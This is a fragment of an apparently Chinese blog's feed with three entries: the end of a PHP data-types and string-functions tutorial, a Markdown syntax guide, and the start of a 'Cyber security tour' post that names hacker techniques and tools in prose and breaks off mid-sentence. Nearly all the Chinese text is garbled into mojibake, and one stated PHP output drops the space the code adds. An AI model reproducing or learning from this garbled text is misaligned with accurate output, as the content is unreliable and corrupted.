å­—ç¬¦ä¸²(string)</h4><p>ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯ä¸€ä¸²å­—ç¬¦çš„åºåˆ—,å¯ä»¥å°†ä»»ä½•æ–‡æœ¬æ”¾åœ¨å•å¼•å·å’ŒåŒå¼•å·ä¸­ã€‚å­—ç¬¦ä¸²å˜é‡ç”¨äºåŒ…å«æœ‰å­—ç¬¦çš„å€¼ã€‚</p><h4 id="PHP-å¹¶ç½®è¿ç®—ç¬¦"><a class="header-anchor" href="#PHP-å¹¶ç½®è¿ç®—ç¬¦">ğŸ­</a>PHP å¹¶ç½®è¿ç®—ç¬¦</h4><p>å¹¶ç½®è¿ç®—ç¬¦ (.) ç”¨äºæŠŠä¸¤ä¸ªå­—ç¬¦ä¸²å€¼è¿æ¥èµ·æ¥ã€‚</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$txt1=<span class="hljs-string">&quot;What a handsome boy!&quot;</span>;$txt2=<span class="hljs-string">&quot;I want to pursue him!&quot;</span>;<span class="hljs-keyword">echo</span> $txt1 . <span class="hljs-string">&quot; &quot;</span> . $txt2;<span class="hljs-meta">?&gt;</span></code></pre><p>ä¸Šé¢çš„ä»£ç å°†è¾“å‡ºï¼šWhat a handsome boy!I want to pursue him!</p><h4 id="PHP-æ•´å‹-Integer"><a class="header-anchor" href="#PHP-æ•´å‹-Integer">ğŸ­</a>PHP æ•´å‹(Integer)</h4><ul><li>æ•´æ•°å¿…é¡»è‡³å°‘æœ‰ä¸€ä¸ªæ•°å­— (0-9)</li><li>æ•´æ•°ä¸èƒ½åŒ…å«é€—å·æˆ–ç©ºæ ¼</li><li>æ•´æ•°æ˜¯æ²¡æœ‰å°æ•°ç‚¹çš„</li><li>æ•´æ•°å¯ä»¥æ˜¯æ­£æ•°æˆ–è´Ÿæ•°</li><li>æ•´å‹å¯ä»¥ç”¨ä¸‰ç§æ ¼å¼æ¥æŒ‡å®šï¼šåè¿›åˆ¶ï¼Œ åå…­è¿›åˆ¶ï¼ˆ ä»¥ 0x ä¸ºå‰ç¼€ï¼‰æˆ–å…«è¿›åˆ¶ï¼ˆå‰ç¼€ä¸º 0ï¼‰.</li></ul><h4 id="PHP-æµ®ç‚¹å‹ï¼ˆfloatï¼‰"><a class="header-anchor" href="#PHP-æµ®ç‚¹å‹ï¼ˆfloatï¼‰">ğŸ­</a>PHP æµ®ç‚¹å‹ï¼ˆfloatï¼‰</h4><p>æµ®ç‚¹æ•°æ˜¯å¸¦å°æ•°éƒ¨åˆ†çš„æ•°å­—ï¼Œæˆ–æ˜¯æŒ‡æ•°å½¢å¼ã€‚</p><h4 id="PHP-å¸ƒå°”å‹-Boolean"><a class="header-anchor" href="#PHP-å¸ƒå°”å‹-Boolean">ğŸ­</a>PHP å¸ƒå°”å‹( Boolean)</h4><p>å¸ƒå°”å‹å¯ä»¥æ˜¯ TRUE æˆ– FALSEï¼Œé€šå¸¸ç”¨äºæ¡ä»¶åˆ¤æ–­ã€‚</p><h4 id="PHP-æ•°ç»„-array"><a class="header-anchor" href="#PHP-æ•°ç»„-array">ğŸ­</a>PHP æ•°ç»„(array)</h4><p>æ•°ç»„å¯ä»¥åœ¨ä¸€ä¸ªå˜é‡ä¸­å­˜å‚¨å¤šä¸ªå€¼ã€‚</p><h4 id="PHP-å¯¹è±¡"><a class="header-anchor" href="#PHP-å¯¹è±¡">ğŸ­</a>PHP å¯¹è±¡</h4><p>å¯¹è±¡æ•°æ®ç±»å‹ä¹Ÿå¯ä»¥ç”¨äºå­˜å‚¨æ•°æ®.åœ¨ PHP ä¸­ï¼Œå¿…é¡»ä½¿ç”¨classå…³é”®å­—å£°æ˜ç±»å¯¹è±¡,ç±»æ˜¯å¯ä»¥åŒ…å«å±æ€§å’Œæ–¹æ³•çš„ç»“æ„ã€‚PHPå…³é”®å­—thisæŒ‡å‘å½“å‰å¯¹è±¡å®ä¾‹çš„æŒ‡é’ˆï¼Œä¸æŒ‡å‘ä»»ä½•å…¶ä»–å¯¹è±¡æˆ–ç±»ã€‚</p><h4 id="PHP-NULL-å€¼"><a class="header-anchor" href="#PHP-NULL-å€¼">ğŸ­</a>PHP NULL å€¼</h4><p>NULL å€¼è¡¨ç¤ºå˜é‡æ²¡æœ‰å€¼ã€‚NULL æ˜¯æ•°æ®ç±»å‹ä¸º NULL çš„å€¼ã€‚</p><p>NULL å€¼æŒ‡æ˜ä¸€ä¸ªå˜é‡æ˜¯å¦ä¸ºç©ºå€¼ã€‚ åŒæ ·å¯ç”¨äºæ•°æ®ç©ºå€¼å’ŒNULLå€¼çš„åŒºåˆ«ã€‚</p><h2 id="PHP-å¸¸é‡"><a class="header-anchor" href="#PHP-å¸¸é‡">ğŸ­</a>PHP å¸¸é‡</h2><p>å¸¸é‡æ˜¯ä¸€ä¸ªç®€å•å€¼çš„æ ‡è¯†ç¬¦ã€‚è¯¥å€¼åœ¨è„šæœ¬çš„å…¶å®ƒä»»ä½•åœ°æ–¹éƒ½ä¸èƒ½æ”¹å˜ã€‚ä¸€ä¸ªå¸¸é‡ç”±è‹±æ–‡å­—æ¯ã€ä¸‹åˆ’çº¿ã€å’Œæ•°å­—ç»„æˆ,ä½†æ•°å­—ä¸èƒ½ä½œä¸ºé¦–å­—æ¯å‡ºç°ã€‚ (å¸¸é‡åä¸éœ€è¦åŠ  $ ä¿®é¥°ç¬¦,ä¸ç„¶ä¼šå°†å¸¸é‡è½¬æ¢æˆæ–°çš„æœªå®šä¹‰å˜é‡ä½¿ç”¨ï¼Œä¼šå¯¼è‡´æŠ¥é”™)ã€‚<strong>å¸¸é‡åœ¨å®šä¹‰åï¼Œé»˜è®¤æ˜¯å…¨å±€å˜é‡ï¼Œå¯ä»¥åœ¨æ•´ä¸ªè¿è¡Œçš„è„šæœ¬çš„ä»»ä½•åœ°æ–¹ä½¿ç”¨ã€‚</strong></p><h4 id="è®¾ç½®-PHP-å¸¸é‡"><a class="header-anchor" href="#è®¾ç½®-PHP-å¸¸é‡">ğŸ­</a>è®¾ç½® PHP å¸¸é‡</h4><p>define() å‡½æ•°:</p><pre><code class="hljs lasso">bool <span class="hljs-class"><span class="hljs-keyword">define</span> </span>( <span class="hljs-built_in">string</span> $name , mixed $value <span class="hljs-meta">[</span>, bool $case_insensitive = <span class="hljs-literal">false</span> <span class="hljs-meta">]</span> )</code></pre><ul><li>**nameï¼š**å¿…é€‰å‚æ•°ï¼Œå¸¸é‡åç§°ï¼Œå³æ ‡å¿—ç¬¦ã€‚</li><li>**valueï¼š**å¿…é€‰å‚æ•°ï¼Œå¸¸é‡çš„å€¼ã€‚</li><li><strong>case_insensitive</strong> ï¼šå¯é€‰å‚æ•°ï¼Œå¦‚æœè®¾ç½®ä¸º TRUEï¼Œè¯¥å¸¸é‡åˆ™å¤§å°å†™ä¸æ•æ„Ÿã€‚é»˜è®¤æ˜¯å¤§å°å†™æ•æ„Ÿçš„ã€‚</li></ul><h4 id="PHP-strlen-å‡½æ•°"><a class="header-anchor" href="#PHP-strlen-å‡½æ•°">ğŸ­</a>PHP strlen() å‡½æ•°</h4><p>å¸¸å¸¸ç”¨åœ¨å¾ªç¯å’Œå…¶ä»–å‡½æ•°ä¸­</p><p>strlen() å‡½æ•°è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ï¼ˆå­—èŠ‚æ•°ï¼‰</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">echo</span> strlen(<span class="hljs-string">&quot;åŠŸå¤«ç†ŠçŒ«&quot;</span>);   <span class="hljs-comment">// è¾“å‡º 12</span><span class="hljs-meta">?&gt;</span></code></pre><p>è¾“å‡ºç»“æœä¸º 12ï¼Œå› ä¸ºä¸€ä¸ªä¸­æ–‡å  3 ä¸ªå­—ç¬¦æ•°ã€‚</p><p>å¯ä»¥ä½¿ç”¨ mb_strlen è®¾ç½®æŒ‡å®šç¼–ç è¾“å‡ºä¸­æ–‡å­—ç¬¦ä¸ªæ•°(ä¸­æ–‡ä¸‹çš„å­—ç¬¦åœ¨ UTF-8 ä¸‹æ˜¯ 3 ä¸ªå­—ç¬¦é•¿åº¦ï¼Œåœ¨ gbk ä¸‹æ˜¯2ä¸ªå­—ç¬¦é•¿åº¦)</p><h4 id="PHP-strpos-å‡½æ•°"><a class="header-anchor" href="#PHP-strpos-å‡½æ•°">ğŸ­</a>PHP strpos() å‡½æ•°</h4><p>strpos() å‡½æ•°ç”¨äºåœ¨å­—ç¬¦ä¸²å†…æŸ¥æ‰¾ä¸€ä¸ªå­—ç¬¦æˆ–ä¸€æ®µæŒ‡å®šçš„æ–‡æœ¬ã€‚(mb_strpos æŒ‰å­—å¤„ç†ï¼Œstrpos æŒ‰å­—ç¬¦å¤„ç†)</p><p>å¦‚æœåœ¨å­—ç¬¦ä¸²ä¸­æ‰¾åˆ°åŒ¹é…ï¼Œè¯¥å‡½æ•°ä¼šè¿”å›ç¬¬ä¸€ä¸ªåŒ¹é…çš„å­—ç¬¦ä½ç½®ã€‚å¦‚æœæœªæ‰¾åˆ°åŒ¹é…ï¼Œåˆ™è¿”å› FALSEã€‚</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">echo</span> strpos(<span class="hljs-string">&quot;what a handsome boy!&quot;</span>,<span class="hljs-string">&quot;handsome&quot;</span>);<span class="hljs-meta">?&gt;</span></code></pre><p>ä¸Šé¢çš„ä»£ç å°†è¾“å‡ºï¼š7</p><p>åœ¨ä¸Šé¢çš„å®ä¾‹ä¸­ï¼Œå­—ç¬¦ä¸² â€œhandsomeâ€ çš„ä½ç½®æ˜¯ 7ã€‚ä¹‹æ‰€ä»¥æ˜¯ 7è€Œä¸æ˜¯ 8 çš„åŸå› æ˜¯ï¼Œå­—ç¬¦ä¸²ä¸­ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ä½ç½®æ˜¯ 0ï¼Œè€Œä¸æ˜¯ 1ã€‚</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>markdown</title>
    <link href="/2020/10/09/markdown/"/>
    <url>/2020/10/09/markdown/</url>
    
    <content type="html"><![CDATA[<h1>MarkDownï¼š</h1><ul><li><a href="#markdown">MarkDownï¼š</a><ul><li><em><a href="#%E4%B8%80%E7%BC%96%E8%BE%91%E5%99%A8">ä¸€ã€ç¼–è¾‘å™¨</a></em></li><li><em><a href="#%E4%BA%8C%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95">äºŒã€åŸºæœ¬ç”¨æ³•</a></em></li><li><em><a href="#%E4%B8%89%E8%AF%AD%E6%B3%95">ä¸‰ã€è¯­æ³•</a></em><ul><li><em><a href="#1%E6%A0%87%E9%A2%98">1ã€æ ‡é¢˜</a></em></li><li><em><a href="#2%E6%96%87%E5%AD%97%E6%A0%BC%E5%BC%8F">2ã€æ–‡å­—æ ¼å¼</a></em><ul><li><em><a href="#1%E7%B2%97%E4%BD%93">(1)ç²—ä½“ï¼š</a></em></li><li><em><a href="#2%E6%96%9C%E4%BD%93">(2)æ–œä½“ï¼š</a></em></li><li><em><a href="#3%E7%B2%97%E6%96%9C%E4%BD%93">(3)ç²—æ–œä½“ï¼š</a></em></li><li><em><a href="#4%E5%88%A0%E9%99%A4">(4)åˆ é™¤:</a></em></li></ul></li></ul></li><li><em><a href="#3%E5%88%97%E8%A1%A8">3ã€åˆ—è¡¨</a></em><ul><li><em><a href="#1%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8">(1)æ— åºåˆ—è¡¨ï¼š</a></em></li><li><em><a href="#2%E6%9C%89%E5%BA%8F%E5%88%97%E8%A1%A8">(2)æœ‰åºåˆ—è¡¨:</a></em></li></ul></li><li><em><a href="#4%E9%93%BE%E6%8E%A5">4ã€é“¾æ¥</a></em><ul><li><em><a href="#1%E7%9B%B4%E6%8E%A5%E8%AE%BE%E7%BD%AE%E8%A1%8C%E5%86%85%E5%BD%A2%E5%BC%8F">(1)ç›´æ¥è®¾ç½®ï¼ˆè¡Œå†…å½¢å¼)</a></em></li><li><em><a href="#2%E9%97%B4%E6%8E%A5%E8%AE%BE%E7%BD%AE%E5%8F%82%E8%80%83%E5%BD%A2%E5%BC%8F">(2)é—´æ¥è®¾ç½®ï¼ˆå‚è€ƒå½¢å¼ï¼‰</a></em></li><li><em><a href="#3%E9%9A%90%E5%BC%8F%E8%AE%BE%E7%BD%AE">(3ï¼‰éšå¼è®¾ç½®</a></em></li></ul></li><li><em><a href="#5%E5%9B%BE%E7%89%87">5ã€å›¾ç‰‡</a></em></li><li><em><a href="#6%E5%BC%95%E7%94%A8">6ã€å¼•ç”¨</a></em></li><li><em><a href="#7%E6%B0%B4%E5%B9%B3%E5%88%86%E5%89%B2%E7%BA%BF">7ã€æ°´å¹³åˆ†å‰²çº¿</a></em></li><li><em><a href="#8%E8%A1%A8%E6%A0%BC">8ã€è¡¨æ ¼</a></em></li><li><em><a href="#9%E4%BB%A3%E7%A0%81">9ã€ä»£ç </a></em><ul><li><em><a href="#1%E4%BB%A3%E7%A0%81%E5%8F%A5">(1ï¼‰ä»£ç å¥</a></em></li><li><em><a href="#2%E4%BB%A3%E7%A0%81%E6%AE%B5">(2ï¼‰ä»£ç æ®µ</a></em></li><li><em><a href="#3%E7%94%A8%E4%B8%89%E4%B8%AA%E4%BB%A5%E4%B8%8A%E7%9A%84%E5%8F%8D%E5%BC%95%E5%8F%B7%E5%AE%9A%E4%B9%89%E6%AE%B5%E5%BC%80%E5%A7%8B%E5%92%8C%E7%BB%93%E6%9D%9F">(3ï¼‰ç”¨ä¸‰ä¸ªä»¥ä¸Šçš„åå¼•å·å®šä¹‰æ®µå¼€å§‹å’Œç»“æŸ</a></em></li></ul></li><li><em><a href="#10%E7%9B%AE%E5%BD%95">10ã€ç›®å½•</a></em></li><li><em><a href="#11%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6">11ã€è½¬ä¹‰å­—ç¬¦</a></em></li><li><em><a href="#12uml%E5%9B%BE">12ã€UMLå›¾</a></em><ul><li><em><a href="#%E6%B8%B2%E6%9F%93%E5%BA%8F%E5%88%97%E5%9B%BE">æ¸²æŸ“åºåˆ—å›¾ï¼š</a></em></li></ul></li></ul></li></ul><h2 id="ä¸€ã€ç¼–è¾‘å™¨"><a class="header-anchor" href="#ä¸€ã€ç¼–è¾‘å™¨">ğŸ­</a><em>ä¸€ã€ç¼–è¾‘å™¨</em></h2><p><strong>1ã€MarkDown Pad2</strong></p><p><a href="http://markdownpad.com/">MarkDown Pad2</a>ç›®å‰ç”¨çš„äººå¤šï¼Œå®ƒå¯ä»¥è¾¹å†™è¾¹é¢„è§ˆæ•ˆæœï¼Œå…è´¹ç”Ÿæˆhtmlæ–‡æ¡£ï¼Œä½†ç”Ÿæˆpdfæ–‡æ¡£é¡»å‡çº§æˆä¸“ä¸šç‰ˆã€‚</p><p><strong>2ã€Typoraï¼ˆæ¨èï¼‰</strong></p><p><a href="https://www.typora.io/">Typora</a>è¾ƒä¸ºä¾¿åˆ©ï¼Œè¾“å…¥æ ‡è®°ç¬¦å·åï¼Œè½¯ä»¶ä¼šè‡ªåŠ¨å¯¹æ ‡è®°çš„æ–‡æœ¬è¿›è¡Œæ¸²æŸ“ï¼Œç”Ÿæˆæ ¼å¼ã€‚</p><h2 id="äºŒã€åŸºæœ¬ç”¨æ³•"><a class="header-anchor" href="#äºŒã€åŸºæœ¬ç”¨æ³•">ğŸ­</a><em>äºŒã€åŸºæœ¬ç”¨æ³•</em></h2><p>1ã€å•ä¸ªå›è½¦=ç©ºæ ¼<br>2ã€è¿ç»­å›è½¦=åˆ†æ®µ<br>3ã€è¡Œå°¾åŠ ä¸¤ä¸ªç©ºæ ¼=æ®µå†…æ¢è¡Œ<br>4ã€HTMLçš„æ³¨é‡Š</p><h2 id="ä¸‰ã€è¯­æ³•"><a class="header-anchor" href="#ä¸‰ã€è¯­æ³•">ğŸ­</a><em>ä¸‰ã€è¯­æ³•</em></h2><h3 id="1ã€æ ‡é¢˜"><a class="header-anchor" href="#1ã€æ ‡é¢˜">ğŸ­</a>1ã€æ ‡é¢˜</h3><p>#å·ä¹‹åè®°å¾—ç©ºæ ¼ï¼Œå…±æœ‰å…­çº§æ ‡é¢˜ï¼Œä»¥æ­¤ç±»æ¨ã€‚</p><p><img src="/2020/10/09/markdown/%E6%A0%87%E9%A2%98.jpg" alt="æ ‡é¢˜"></p><h3 id="2ã€æ–‡å­—æ ¼å¼"><a class="header-anchor" href="#2ã€æ–‡å­—æ ¼å¼">ğŸ­</a>2ã€æ–‡å­—æ ¼å¼</h3><h4 id="1-ç²—ä½“ï¼š"><a class="header-anchor" href="#1-ç²—ä½“ï¼š">ğŸ­</a>(1)ç²—ä½“ï¼š</h4><p>å°†éœ€è¦è®¾ç½®ä¸ºæ–œä½“çš„æ–‡å­—ä¸¤ç«¯ä½¿ç”¨2ä¸ªâ€œ*â€æˆ–è€…â€œ_â€å¤¹èµ·æ¥</p><p><img src="/2020/10/09/markdown/%E6%96%9C%E4%BD%93.jpg" alt="æ–œä½“"></p><h4 id="2-æ–œä½“ï¼š"><a class="header-anchor" href="#2-æ–œä½“ï¼š">ğŸ­</a>(2)æ–œä½“ï¼š</h4><p>å°†éœ€è¦è®¾ç½®ä¸ºæ–œä½“çš„æ–‡å­—ä¸¤ç«¯ä½¿ç”¨1ä¸ªâ€œ*â€æˆ–è€…â€œ_â€å¤¹èµ·æ¥</p><p><img src="/2020/10/09/markdown/%E6%96%9C.jpg" alt="æ–œ"></p><h4 id="3-ç²—æ–œä½“ï¼š"><a class="header-anchor" href="#3-ç²—æ–œä½“ï¼š">ğŸ­</a>(3)ç²—æ–œä½“ï¼š</h4><p>å°†éœ€è¦è®¾ç½®ä¸ºæ–œä½“çš„æ–‡å­—ä¸¤ç«¯ä½¿ç”¨3ä¸ªâ€œ*â€æˆ–è€…â€œ_â€å¤¹èµ·æ¥</p><p><img src="/2020/10/09/markdown/%E7%B2%97%E6%96%9C.jpg" alt="ç²—æ–œ"></p><h4 id="4-åˆ é™¤"><a class="header-anchor" href="#4-åˆ é™¤">ğŸ­</a>(4)åˆ é™¤:</h4><p>ä½¿ç”¨2ä¸ª~å·å³å¯ã€‚</p><p><img src="/2020/10/09/markdown/%E5%88%A0.jpg" alt="åˆ "></p><h2 id="3ã€åˆ—è¡¨"><a class="header-anchor" href="#3ã€åˆ—è¡¨">ğŸ­</a>3ã€åˆ—è¡¨</h2><h3 id="1-æ— åºåˆ—è¡¨ï¼š"><a class="header-anchor" href="#1-æ— åºåˆ—è¡¨ï¼š">ğŸ­</a>(1)æ— åºåˆ—è¡¨ï¼š</h3><p>åœ¨æ–‡å­—å¼€å¤´æ·»åŠ (*,+,-)å®ç°æ— åºåˆ—è¡¨ã€‚ä½†æ˜¯è¦æ³¨æ„åœ¨ç¬¦å·å’Œæ–‡å­—ä¹‹é—´éœ€è¦æ·»åŠ ç©ºæ ¼ã€‚</p><p>åµŒå¥—:ä¸Šä¸€çº§å’Œä¸‹ä¸€çº§ä¹‹é—´éœ€è¦ä¸‰ä¸ªç©ºæ ¼æˆ–tabé”®</p><p><img src="/2020/10/09/markdown/%E5%B5%8C%E5%A5%97.jpg" alt="åµŒå¥—"></p><h3 id="2-æœ‰åºåˆ—è¡¨"><a class="header-anchor" href="#2-æœ‰åºåˆ—è¡¨">ğŸ­</a>(2)æœ‰åºåˆ—è¡¨:</h3><p>ä½¿ç”¨æ•°å­—åé¢è·Ÿä¸Šå¥å·,è¿˜è¦æœ‰ç©ºæ ¼ã€‚</p><p><img src="/2020/10/09/markdown/%E5%88%97%E8%A1%A8.jpg" alt="åˆ—è¡¨"></p><h2 id="4ã€é“¾æ¥"><a class="header-anchor" href="#4ã€é“¾æ¥">ğŸ­</a>4ã€é“¾æ¥</h2><h3 id="1-ç›´æ¥è®¾ç½®ï¼ˆè¡Œå†…å½¢å¼"><a class="header-anchor" href="#1-ç›´æ¥è®¾ç½®ï¼ˆè¡Œå†…å½¢å¼">ğŸ­</a>(1)ç›´æ¥è®¾ç½®ï¼ˆè¡Œå†…å½¢å¼)</h3><p>è¯­æ³•ï¼š<a href="%E9%93%BE%E6%8E%A5%E5%9C%B0%E5%9D%80" title="é“¾æ¥title">é“¾æ¥å</a></p><h3 id="2-é—´æ¥è®¾ç½®ï¼ˆå‚è€ƒå½¢å¼ï¼‰"><a class="header-anchor" href="#2-é—´æ¥è®¾ç½®ï¼ˆå‚è€ƒå½¢å¼ï¼‰">ğŸ­</a>(2)é—´æ¥è®¾ç½®ï¼ˆå‚è€ƒå½¢å¼ï¼‰</h3><p><strong>è¯­æ³•ï¼š[é“¾æ¥åç§°][æ ‡è®°]</strong><br>[æ ‡è®°]: é“¾æ¥åœ°å€ â€œé“¾æ¥titleâ€</p><h3 id="3ï¼‰éšå¼è®¾ç½®"><a class="header-anchor" href="#3ï¼‰éšå¼è®¾ç½®">ğŸ­</a>(3ï¼‰éšå¼è®¾ç½®</h3><p><strong>è¯­æ³•ï¼š[é“¾æ¥åç§°][]</strong><br>[é“¾æ¥åç§°]: é“¾æ¥åœ°å€ â€œé“¾æ¥titleâ€</p><h2 id="5ã€å›¾ç‰‡"><a class="header-anchor" href="#5ã€å›¾ç‰‡">ğŸ­</a>5ã€å›¾ç‰‡</h2><p>ç›´æ¥å¤åˆ¶ä¸€ä¸ªå›¾ç‰‡è·¯å¾„åˆ°ç¼–è¾‘å™¨ï¼Œç„¶åå‰é¢åŠ ä¸Šæ„Ÿå¹å·ï¼å³å¯</p><h2 id="6ã€å¼•ç”¨"><a class="header-anchor" href="#6ã€å¼•ç”¨">ğŸ­</a>6ã€å¼•ç”¨</h2><p>ï¼ˆ1ï¼‰å¼•ç”¨æ¢è¡Œï¼šæœ«å°¾åŠ ä¸¤ä¸ªç©ºæ ¼ã€‚</p><p>(2ï¼‰å¼•ç”¨å†…åŒ…å«å…¶ä»–è¯­æ³•ï¼š</p><p>**å¦‚ï¼š**æ ‡é¢˜ã€åˆ—è¡¨ã€ä»£ç å— <strong>ä¸€å®šè¦å†™åœ¨å¼•å¼€å¤´å¤„</strong></p><p><img src="/2020/10/09/markdown/%E5%BC%95.jpg" alt="å¼•"></p><h2 id="7ã€æ°´å¹³åˆ†å‰²çº¿"><a class="header-anchor" href="#7ã€æ°´å¹³åˆ†å‰²çº¿">ğŸ­</a>7ã€æ°´å¹³åˆ†å‰²çº¿</h2><p>ç”¨3ä¸ªè¿ç»­çš„*æˆ–_æˆ–-å³å¯</p><h2 id="8ã€è¡¨æ ¼"><a class="header-anchor" href="#8ã€è¡¨æ ¼">ğŸ­</a>8ã€è¡¨æ ¼</h2><p>å…³äºå†’å·ï¼ˆ:ï¼‰</p><p>**å·¦è¾¹ï¼š**ä»¥ä¸‹å†…å®¹å·¦å¯¹é½</p><p>**å³è¾¹ï¼š**ä»¥ä¸‹å†…å®¹å³å¯¹é½</p><p>**ä¸¤è¾¹ï¼š**ä»¥ä¸‹å†…å®¹å±…ä¸­å¯¹é½</p><p><img src="/2020/10/09/markdown/%E8%A1%A8%E6%A0%BC.jpg" alt="è¡¨æ ¼"></p><h2 id="9ã€ä»£ç "><a class="header-anchor" href="#9ã€ä»£ç ">ğŸ­</a>9ã€ä»£ç </h2><h3 id="1ï¼‰ä»£ç å¥"><a class="header-anchor" href="#1ï¼‰ä»£ç å¥">ğŸ­</a>(1ï¼‰ä»£ç å¥</h3><p>ç”¨åå¼•å·ï¼ˆ`ï¼‰ï¼Œå°±æ˜¯è‹±æ–‡çŠ¶æ€ä¸‹çš„æ³¢æµªçº¿ã€‚</p><h3 id="2ï¼‰ä»£ç æ®µ"><a class="header-anchor" href="#2ï¼‰ä»£ç æ®µ">ğŸ­</a>(2ï¼‰ä»£ç æ®µ</h3><p>4ä¸ªç©ºæ ¼ï¼ˆæˆ–Tabç¼©è¿›ï¼‰å®šä¹‰ä»£ç å—ã€‚</p><h3 id="3ï¼‰ç”¨ä¸‰ä¸ªä»¥ä¸Šçš„åå¼•å·å®šä¹‰æ®µå¼€å§‹å’Œç»“æŸ"><a class="header-anchor" href="#3ï¼‰ç”¨ä¸‰ä¸ªä»¥ä¸Šçš„åå¼•å·å®šä¹‰æ®µå¼€å§‹å’Œç»“æŸ">ğŸ­</a>(3ï¼‰ç”¨ä¸‰ä¸ªä»¥ä¸Šçš„åå¼•å·å®šä¹‰æ®µå¼€å§‹å’Œç»“æŸ</h3><h2 id="10ã€ç›®å½•"><a class="header-anchor" href="#10ã€ç›®å½•">ğŸ­</a>10ã€ç›®å½•</h2><p>åœ¨æƒ³åŠ ç›®å½•çš„åœ°æ–¹è¾“å…¥[TOC]</p><h2 id="11ã€è½¬ä¹‰å­—ç¬¦"><a class="header-anchor" href="#11ã€è½¬ä¹‰å­—ç¬¦">ğŸ­</a>11ã€è½¬ä¹‰å­—ç¬¦</h2><p><img src="/2020/10/09/markdown/%E5%AD%97%E7%AC%A6.jpg" alt="å­—ç¬¦"></p><h2 id="12ã€UMLå›¾"><a class="header-anchor" href="#12ã€UMLå›¾">ğŸ­</a>12ã€UMLå›¾</h2><h3 id="æ¸²æŸ“åºåˆ—å›¾ï¼š"><a class="header-anchor" href="#æ¸²æŸ“åºåˆ—å›¾ï¼š">ğŸ­</a>æ¸²æŸ“åºåˆ—å›¾ï¼š</h3><p><img src="/2020/10/09/markdown/%E5%93%88.jpg" alt="å“ˆ"></p><p>æ•ˆæœå¦‚ä¸‹:</p><p><img src="/2020/10/09/markdown/%E5%95%A6.jpg" alt="å•¦"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Cyber security tour</title>
    <link href="/2020/10/05/Cyber/"/>
    <url>/2020/10/05/Cyber/</url>
    
    <content type="html"><![CDATA[<p>é»‘å®¢(Hacherï¼‰</p><p><img src="/2020/10/05/Cyber/%E9%BB%91%E5%AE%A2.jpg" alt="é»‘å®¢"></p><p>æºäºè‹±è¯­åŠ¨è¯ hackï¼Œæ„ä¸ºâ€œåŠˆï¼Œç â€ã€‚é»‘å®¢ä¸»è¦åˆ©ç”¨è®¡ç®—æœºç³»ç»Ÿæˆ–ç½‘ç»œçš„æ¼æ´ï¼ŒåŒ…æ‹¬è½¯ä»¶æ¼æ´ã€ç¡¬ä»¶æ¼æ´ã€ç½‘ç»œåè®®æ¼æ´ã€ç®¡ç†æ–¹é¢çš„æ¼æ´å–ä¸€äº›äººä¸ºçš„é”™è¯¯ï¼Œé€šè¿‡ç°æœ‰çš„æˆ–è‡ªå·±å¼€å‘çš„å·¥å…·è½¯ä»¶å®æ–½æ”»å‡»ã€‚é»‘å®¢æ”»å‡»æ‰‹æ®µä¸»è¦åŒ…æ‹¬ï¼š<br>ï¼ˆ1ï¼‰æ¢æµ‹æ”»å‡»ã€‚é€šè¿‡å°‘ç¥¨å…è®¸è¿æ¥çš„æœåŠ¡å’Œå¼€æ”¾çš„ç«¯å£ï¼Œèƒ½å¤Ÿè¿…é€Ÿå‘ç°ç›®æ ‡ä¸»æœºç«¯å£çš„åˆ†é…æƒ…å†µä»¥åŠæä¾›çš„å„é¡¹æœåŠ¡å’ŒæœåŠ¡ç¨‹åºçš„ç‰ˆæœ¬å·ï¼Œé»‘å®¢æ‰¾åˆ°æœ‰æœºå¯ä¹˜çš„æœåŠ¡æˆ–ç«¯å£åè¿›è¡Œæ”»å‡»ã€‚å¸¸è§çš„æ¢æµ‹æ”»å‡»ç¨‹åºæœ‰ï¼šSATANã€Saintã€NTscanã€Nessusç­‰ã€‚<br>(2)ç½‘ç»œç›‘å¬ã€‚å°†ç½‘å¡è®¾ç½®ä¸ºæ··æ‚æ¨¡å¼ï¼Œå¯¹ä»¥å¤ªç½‘ä¸Šæµé€šçš„æ‰€æœ‰æ•°æ®åŒ…è¿›è¡Œç›‘å¬ï¼Œå¹¶å°†ç¬¦åˆä¸€å®šæ¡ä»¶çš„æ•°æ®åŒ…è®°å½•åˆ°æ–‡ä»¶ä¸­å»ï¼Œä»¥è·å–æ•æ„Ÿä¿¡æ¯ã€‚å¸¸è§çš„ç½‘ç»œç›‘å¬å·¥å…·æœ‰ï¼šNetRayã€Sniffitã€Snifferã€Etherfindã€Snoopç­‰ã€‚<br>ï¼ˆ3)è§£ç ç±»æ”»å‡»ã€‚é€šè¿‡å„ç§æ–¹æ³•è·å– passwordæ–‡ä»¶ï¼Œç„¶åç”¨å£ä»¤çŒœæµ‹ç¨‹åºç ´è¯‘ç”¨æˆ·è´¦å·å’Œå¯†ç ã€‚å¸¸è§çš„å·¥å…·æœ‰ï¼šCrackã€LOphtCrackã€John the Ripperç­‰ã€‚<br>(4)æœªæˆæƒè®¿é—®å°è¯•ã€‚åˆ©ç”¨ç³»ç»Ÿç®¡ç†ç­–ç•¥æˆ–é…ç½®æ–‡ä»¶çš„æ¼æ´ï¼Œè·å¾—æ¯”åˆæ³•æƒé™æ›´é«˜çš„æ“ä½œæƒã€‚å¦‚ï¼šNFSçŒœæµ‹ã€NFS UIDæ£€æŸ¥ç­‰ã€‚<br>(5)ç¼“å†²åŒºæº¢å‡ºã€‚é€šè¿‡å¾€ç¨‹åºçš„ç¼“å†²åŒºå†™è¶…å‡ºå…¶é•¿åº¦çš„å†…å®¹ï¼Œé€ æˆç¼“å†²åŒºçš„æº¢å‡ºï¼Œä»è€Œç ´åç¨‹<br>åºçš„å †æ ˆï¼Œä½¿ç¨‹åºè½¬è€Œæ‰§è¡Œå…¶ä»–çš„æŒ‡ä»¤ï¼Œå¦‚æœè¿™äº›æŒ‡ä»¤æ˜¯æ”¾åœ¨root 